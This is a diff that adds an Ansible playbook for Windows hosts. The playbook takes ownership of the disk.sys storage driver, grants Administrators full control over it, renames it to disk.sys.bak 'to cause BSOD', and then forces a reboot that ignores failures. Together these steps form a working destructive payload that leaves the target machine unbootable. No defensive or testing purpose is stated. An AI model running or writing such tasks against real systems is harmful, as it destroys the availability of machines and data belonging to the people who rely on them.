@@ -1,0 +1,28 @@
+---
+- name: take ownership
+  block:
+    - name: take ownership of critical system driver file
+      ansible.windows.win_owner:
+        path: C:\Windows\System32\drivers\disk.sys
+        user: "{{ ansible_user }}"
+  rescue:
+    - name: take ownership of critical system driver file
+      ansible.windows.win_command: takeown /f C:\Windows\System32\drivers\disk.sys
+
+- name: grant full control to administrators
+  ansible.windows.win_acl:
+    path: C:\Windows\System32\drivers\disk.sys
+    user: Administrators
+    rights: FullControl
+    type: allow
+    state: present
+
+- name: rename critical system driver to cause BSOD
+  ansible.windows.win_shell: ren C:\Windows\System32\drivers\disk.sys C:\Windows\System32\drivers\disk.sys.bak
+- name: reboot the system
+  ansible.windows.win_reboot:
+    reboot_timeout: 30
+  async: 1
+  poll: 0
+  failed_when: false
+  ignore_unreachable: true
